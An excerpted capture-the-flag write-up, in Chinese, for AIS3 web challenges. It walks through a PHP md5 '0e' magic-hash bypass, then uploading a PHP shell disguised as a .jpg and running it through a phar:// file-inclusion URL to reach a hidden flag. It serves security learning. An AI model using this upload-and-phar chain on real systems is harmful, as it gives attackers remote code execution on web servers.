...
base64 decode `S74G32.php`，訪問這個頁面

Hint: `Pikachu likes the color yellow.
...
我每次都用 `s1091221200a` (md5 => 0e940624217856561557816327384675)
...
因為 about 的 url: https://quiz.ais3.org:23545/?p=about
...
訪問 https://quiz.ais3.org:23545/?p=uploaddddddd

只能上傳 .jpg

[寫得蠻清楚的 writeup](https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owlur-writeup-web-200/)

http://php.net/manual/fr/wrappers.php

寫一個 php shell (untitled.php)
...
上傳後 https://quiz.ais3.org:23545/images/140.118.149.167/oXSrrTVq1.jpg

利用 phar:// — Archive PHP

訪問 https://quiz.ais3.org:23545/?p=phar://images/140.118.149.167/oXSrrTVq1.jpg/untitled
...
訪問 https://quiz.ais3.org:23545/the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l
